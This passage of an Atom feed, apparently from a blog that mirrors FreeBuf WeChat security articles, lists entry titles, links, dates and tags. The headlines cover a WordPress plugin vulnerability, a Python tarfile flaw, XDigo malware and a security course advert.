-    <link href="http://example.com/2025/06/25/weixin_2727420805/"/>
-    <id>http://example.com/2025/06/25/weixin_2727420805/</id>
-    <published>2025-06-25T05:22:41.378Z</published>
-    <updated>2025-06-25T05:22:41.373Z</updated>
-    
-    <content type="html"><![CDATA[<p><strong>公众号：</strong> FreeBuf</p><p><strong>链接：</strong> <a href="https://mp.weixin.qq.com/s/iq9ZeW4iX2RZAyJPKB101A">https://mp.weixin.qq.com/s/iq9ZeW4iX2RZAyJPKB101A</a></p>]]></content>
-    
-    
-      
-      
-    <summary type="html">&lt;p&gt;&lt;strong&gt;公众号：&lt;/strong&gt; FreeBuf&lt;/p&gt;
-&lt;p&gt;&lt;strong&gt;链接：&lt;/strong&gt; &lt;a href=&quot;https://mp.weixin.qq.com/s/iq9ZeW4iX2RZAyJPKB101A&quot;&gt;https://mp.weixin.q</summary>
-      
-    
-    
-    
-    <category term="微信公众号" scheme="http://example.com/categories/%E5%BE%AE%E4%BF%A1%E5%85%AC%E4%BC%97%E5%8F%B7/"/>
-    
-    
-    <category term="mp.weixin.qq.com" scheme="http://example.com/tags/mp-weixin-qq-com/"/>
-    
-    <category term="FreeBuf" scheme="http://example.com/tags/FreeBuf/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>逾10万个WordPress网站因MCP漏洞面临权限提升攻击风险</title>
-    <link href="http://example.com/2025/06/25/weixin_1127724704/"/>
-    <id>http://example.com/2025/06/25/weixin_1127724704/</id>
-    <published>2025-06-25T05:22:41.040Z</published>
-    <updated>2025-06-25T05:22:41.037Z</updated>
-    
-    <content type="html"><![CDATA[<p><strong>公众号：</strong> FreeBuf</p><p><strong>链接：</strong> <a href="https://mp.weixin.qq.com/s/fG17Qm2O1zAbvVoqOkG2wQ">https://mp.weixin.qq.com/s/fG17Qm2O1zAbvVoqOkG2wQ</a></p>]]></content>
-    
-    
-      
-      
-    <summary type="html">&lt;p&gt;&lt;strong&gt;公众号：&lt;/strong&gt; FreeBuf&lt;/p&gt;
-&lt;p&gt;&lt;strong&gt;链接：&lt;/strong&gt; &lt;a href=&quot;https://mp.weixin.qq.com/s/fG17Qm2O1zAbvVoqOkG2wQ&quot;&gt;https://mp.weixin.q</summary>
-      
-    
-    
-    
-    <category term="微信公众号" scheme="http://example.com/categories/%E5%BE%AE%E4%BF%A1%E5%85%AC%E4%BC%97%E5%8F%B7/"/>
-    
-    
-    <category term="mp.weixin.qq.com" scheme="http://example.com/tags/mp-weixin-qq-com/"/>
-    
-    <category term="FreeBuf" scheme="http://example.com/tags/FreeBuf/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>手游挖洞深度实战 × AI安全赋能，月神SRC课程第四期重磅来袭！</title>
-    <link href="http://example.com/2025/06/25/weixin_2698400310/"/>
-    <id>http://example.com/2025/06/25/weixin_2698400310/</id>
-    <published>2025-06-25T05:22:40.691Z</published>
-    <updated>2025-06-25T05:22:40.685Z</updated>
-    
-    <content type="html"><![CDATA[<p><strong>公众号：</strong> FreeBuf</p><p><strong>链接：</strong> <a href="https://mp.weixin.qq.com/s/_bJxmIhvXRYBodiOAfUk9g">https://mp.weixin.qq.com/s/_bJxmIhvXRYBodiOAfUk9g</a></p>]]></content>
-    
-    
-      
-      
-    <summary type="html">&lt;p&gt;&lt;strong&gt;公众号：&lt;/strong&gt; FreeBuf&lt;/p&gt;
-&lt;p&gt;&lt;strong&gt;链接：&lt;/strong&gt; &lt;a href=&quot;https://mp.weixin.qq.com/s/_bJxmIhvXRYBodiOAfUk9g&quot;&gt;https://mp.weixin.q</summary>
-      
-    
-    
-    
-    <category term="微信公众号" scheme="http://example.com/categories/%E5%BE%AE%E4%BF%A1%E5%85%AC%E4%BC%97%E5%8F%B7/"/>
-    
-    
-    <category term="mp.weixin.qq.com" scheme="http://example.com/tags/mp-weixin-qq-com/"/>
-    
-    <category term="FreeBuf" scheme="http://example.com/tags/FreeBuf/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>6月24日，见证腾讯云大模型安全开箱发布！</title>
-    <link href="http://example.com/2025/06/25/weixin_4148524966/"/>
-    <id>http://example.com/2025/06/25/weixin_4148524966/</id>
-    <published>2025-06-25T05:22:40.376Z</published>
-    <updated>2025-06-25T05:22:40.373Z</updated>
-    
-    <content type="html"><![CDATA[<p><strong>公众号：</strong> FreeBuf</p><p><strong>链接：</strong> <a href="https://mp.weixin.qq.com/s/QkF_BHKaBswzhWLAfeaKlg">https://mp.weixin.qq.com/s/QkF_BHKaBswzhWLAfeaKlg</a></p>]]></content>
-    
-    
-      
-      
-    <summary type="html">&lt;p&gt;&lt;strong&gt;公众号：&lt;/strong&gt; FreeBuf&lt;/p&gt;
-&lt;p&gt;&lt;strong&gt;链接：&lt;/strong&gt; &lt;a href=&quot;https://mp.weixin.qq.com/s/QkF_BHKaBswzhWLAfeaKlg&quot;&gt;https://mp.weixin.q</summary>
-      
-    
-    
-    
-    <category term="微信公众号" scheme="http://example.com/categories/%E5%BE%AE%E4%BF%A1%E5%85%AC%E4%BC%97%E5%8F%B7/"/>
-    
-    
-    <category term="mp.weixin.qq.com" scheme="http://example.com/tags/mp-weixin-qq-com/"/>
-    
-    <category term="FreeBuf" scheme="http://example.com/tags/FreeBuf/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>Python标准库tarfile模块存在任意文件写入高危漏洞，PoC已公开</title>
-    <link href="http://example.com/2025/06/25/weixin_2466346991/"/>
-    <id>http://example.com/2025/06/25/weixin_2466346991/</id>
-    <published>2025-06-25T05:22:40.033Z</published>
-    <updated>2025-06-25T05:22:40.029Z</updated>
-    
-    <content type="html"><![CDATA[<p><strong>公众号：</strong> FreeBuf</p><p><strong>链接：</strong> <a href="https://mp.weixin.qq.com/s/3Q2lniP0XDbgJvsbN8mmWw">https://mp.weixin.qq.com/s/3Q2lniP0XDbgJvsbN8mmWw</a></p>]]></content>
-    
-    
-      
-      
-    <summary type="html">&lt;p&gt;&lt;strong&gt;公众号：&lt;/strong&gt; FreeBuf&lt;/p&gt;
-&lt;p&gt;&lt;strong&gt;链接：&lt;/strong&gt; &lt;a href=&quot;https://mp.weixin.qq.com/s/3Q2lniP0XDbgJvsbN8mmWw&quot;&gt;https://mp.weixin.q</summary>
-      
-    
-    
-    
-    <category term="微信公众号" scheme="http://example.com/categories/%E5%BE%AE%E4%BF%A1%E5%85%AC%E4%BC%97%E5%8F%B7/"/>
-    
-    
-    <category term="mp.weixin.qq.com" scheme="http://example.com/tags/mp-weixin-qq-com/"/>
-    
-    <category term="FreeBuf" scheme="http://example.com/tags/FreeBuf/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>XDigo恶意软件利用Windows LNK漏洞攻击东欧政府机构</title>
-    <link href="http://example.com/2025/06/25/weixin_2814845371/"/>
-    <id>http://example.com/2025/06/25/weixin_2814845371/</id>
-    <published>2025-06-25T05:22:39.706Z</published>
-    <updated>2025-06-25T05:22:39.701Z</updated>
-    
-    <content type="html"><![CDATA[<p><strong>公众号：</strong> FreeBuf</p><p><strong>链接：</strong> <a href="https://mp.weixin.qq.com/s/0aD4AT1uXqMeqSk7zoNFWA">https://mp.weixin.qq.com/s/0aD4AT1uXqMeqSk7zoNFWA</a></p>]]></content>
-    
-    
-      
-      
-    <summary type="html">&lt;p&gt;&lt;strong&gt;公众号：&lt;/strong&gt; FreeBuf&lt;/p&gt;
-&lt;p&gt;&lt;strong&gt;链接：&lt;/strong&gt; &lt;a href=&quot;https://mp.weixin.qq.com/s/0aD4AT1uXqMeqSk7zoNFWA&quot;&gt;https://mp.weixin.q</summary>
       
     
     
